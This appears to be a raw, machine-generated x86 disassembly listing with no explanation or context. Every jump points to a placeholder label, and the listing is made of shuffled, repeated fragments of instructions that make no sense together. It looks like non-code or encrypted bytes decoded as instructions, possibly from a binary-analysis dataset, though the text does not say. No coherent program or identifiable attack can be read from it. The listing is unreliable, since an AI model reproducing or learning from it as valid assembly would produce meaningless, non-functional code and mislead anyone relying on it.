sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
sbb eax 0x925b42f8
jmp r-xdata
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
test [ eax ] ch
jmp r-xdata
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
cmc
jpo r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ eax ]
jpo r-xdata
xchg edx eax
adc esp [ edi - 0x57 ]
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
test ch ch
xlat
outsd
adc [ edi - 0xe ] edi
cli
call [ ebp + 0x388484b5 ]
xchg edx eax
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
loop r-xdata
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
clc
cdq
je r-xdata
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
sub edx [ edx + 0x7b7b78d3 ]
inc esi
jle r-xdata
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
jmp r-xdata

jns r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
jmp r-xdata
jpo r-xdata
je r-xdata
in eax dx
sti
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
jpo r-xdata
or eax 0x78d3922b
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
int3
jpo r-xdata
je r-xdata
jl r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
mov cl 0x84
test [ edx ] ch
xchg edx eax
out dx al
jpo r-xdata
jmp r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
sub_47aaf6
jmp r-xdata
jpo r-xdata
xchg edx eax
jmp r-xdata
test [ eax ] bh
jpo r-xdata
jns r-xdata
mov esp 0x7b7b7bff
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
jpo r-xdata
je r-xdata
xlat
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
cmc
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
outsd
adc [ edi - 0xe ] edi
cli
call [ ebp + 0x388484b5 ]
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
sbb eax 0x925b42f8
jmp r-xdata
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
jpo r-xdata
test [ eax ] ch
jmp r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
jmp r-xdata

adc [ esi ] edx
jmp r-xdata
adc esp [ eax ]
jpo r-xdata
loop r-xdata
xchg edx eax
adc esp [ edi - 0x57 ]
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
test ch ch
xlat
sub edx [ edx + 0x7b7b78d3 ]
inc esi
jle r-xdata
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
je r-xdata
in eax dx
sti
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
clc
cdq
je r-xdata
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
or eax 0x78d3922b
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
int3
jpo r-xdata
je r-xdata
jl r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
mov cl 0x84
test [ edx ] ch
xchg edx eax
out dx al
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
dec eax
mov ebx 0x8485c192
jmp r-xdata
clc
sub_47aaf7
jmp r-xdata
jmp r-xdata
clc
test [ eax ] bh
jpo r-xdata
mov esp 0x7b7b7bff
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
jpo r-xdata
je r-xdata
xlat
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
cmc
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
outsd
adc [ edi - 0xe ] edi
cli
call [ ebp + 0x388484b5 ]
xchg edx eax
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
sbb eax 0x925b42f8
jmp r-xdata
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
jpo r-xdata
test [ eax ] ch
jmp r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
jmp r-xdata

jns r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ eax ]
jpo r-xdata
loop r-xdata
xchg edx eax
adc esp [ edi - 0x57 ]
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
test ch ch
xlat
sub edx [ edx + 0x7b7b78d3 ]
inc esi
jle r-xdata
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
je r-xdata
in eax dx
sti
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
clc
cdq
je r-xdata
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
or eax 0x78d3922b
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
int3
jpo r-xdata
je r-xdata
jl r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
mov cl 0x84
test [ edx ] ch
xchg edx eax
out dx al
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
dec eax
mov ebx 0x8485c192
sub_47aafc
lahf
mov edx 0xd1926483
jpo r-xdata
dec ebx
jmp r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
adc esp [ edi - 0x57 ]
jns r-xdata
test [ eax ] bh
jpo r-xdata
mov esp 0x7b7b7bff
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
jpo r-xdata
je r-xdata
xlat
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
cmc
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ ebx + 0x7b ] bh
jpo r-xdata
outsd
adc [ edi - 0xe ] edi
cli
call [ ebp + 0x388484b5 ]
xchg edx eax
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
sbb eax 0x925b42f8
jmp r-xdata
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
jpo r-xdata
test [ eax ] ch
jmp r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
jmp r-xdata

adc [ esi ] edx
jmp r-xdata
adc esp [ eax ]
jpo r-xdata
loop r-xdata
xchg edx eax
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
test ch ch
xlat
sub edx [ edx + 0x7b7b78d3 ]
inc esi
jle r-xdata
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
je r-xdata
in eax dx
sti
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
clc
cdq
je r-xdata
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
or eax 0x78d3922b
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
int3
jpo r-xdata
je r-xdata
jl r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
mov cl 0x84
test [ edx ] ch
xchg edx eax
out dx al
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
dec eax
mov ebx 0x8485c192
jmp r-xdata
clc
sub_47ab39
mov ebx 0xf07b7b7b
aaa
pop edi
imul esi eax 0xffffffac
xchg ebx eax
imul esp [ ebx + edi * 2 + 0x7b ] 0xfffffffe
mov ebx 0xb595ff74
test [ eax + edi + 0x7bffbcfa ] al
jpo r-xdata
adc [ ebx - 0x7c ] edi
inc eax
movsd [ edi ] [ esi ]
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
mov esp 0x7b7b7bff
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
test al bh
cmp [ edx + 0x74 ] 0xffffffff
loop r-xdata
jpo r-xdata
cmp esi 0xffffff84
xlat
jpo r-xdata
jpo r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
int3
jpo r-xdata
je r-xdata
jl r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
sub edx [ edx + 0x7b7b78d3 ]
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
jpo r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
xchg edx eax
adc esp [ eax ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
inc esi
jle r-xdata
sbb eax 0x925b42f8
jmp r-xdata
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
jpo r-xdata
test [ eax ] ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
clc
cdq
je r-xdata
jpo r-xdata
or eax 0x78d3922b
je r-xdata
in eax dx
sti
jpo r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ edi - 0x57 ]
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
test ch ch
xlat
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub_47ac45
mov ebx 0x8fc8fe74
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
test bl ch
sbb eax 0x929106f2
jpo r-xdata
sub edx [ edx + 0x7b7b78d3 ]
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
loop r-xdata
xchg edx eax
adc esp [ eax ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
clc
cdq
je r-xdata
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
or eax 0x78d3922b
jpo r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
inc esi
jle r-xdata
sbb eax 0x925b42f8
jmp r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub_47ac7a
mov ah 0x84
test bl ch
jmp r-xdata
sar [ eax + 0x7b ] cl
jpo r-xdata
jpo r-xdata
jmp r-xdata
test al bh
cmp [ edx + 0x74 ] 0xffffffff
loop r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
sub edx [ edx + 0x7b7b78d3 ]
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
xchg edx eax
adc esp [ eax ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
clc
cdq
je r-xdata
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
or eax 0x78d3922b
jpo r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
inc esi
jle r-xdata
sbb eax 0x925b42f8
jmp r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub_47ac9e
in al dx
sti
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop esi
mov esp 0x817873e
pop ecx
jpo r-xdata
imul [ edi * 2 - 0x14a0000a ]
jpo r-xdata
cdq
je r-xdata
xchg edx eax
fisubr [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jpo r-xdata
in eax dx
jpo r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
test bl ch
jmp sub_47ac85
retn
xchg edx eax
mov bh 0x98
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
sub edx [ edx + 0x7b7b78d3 ]
test [ ebp + ebx - 0x6da4bd08 ] al
adc [ esi ] edx
jmp r-xdata
clc
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
or eax 0x78d3922b
jpo r-xdata
xchg edx eax
loop r-xdata
adc esp [ eax ]
jpo r-xdata
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
inc esi
jle r-xdata
sbb eax 0x925b42f8
jmp r-xdata
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
test ah ch
sti
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub_47acc8
pop es
pop edi
ja r-xdata
mov dl 0x3a
push eax
mov bl 0x2c
outsd
jpe r-xdata
cdq
je r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
jmp r-xdata
jpo r-xdata
sub edx [ edx + 0x7b7b78d3 ]
test [ ebp + ebx - 0x6da4bd08 ] al
clc
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
or eax 0x78d3922b
jpo r-xdata
xchg edx eax
loop r-xdata
adc esp [ eax ]
jpo r-xdata
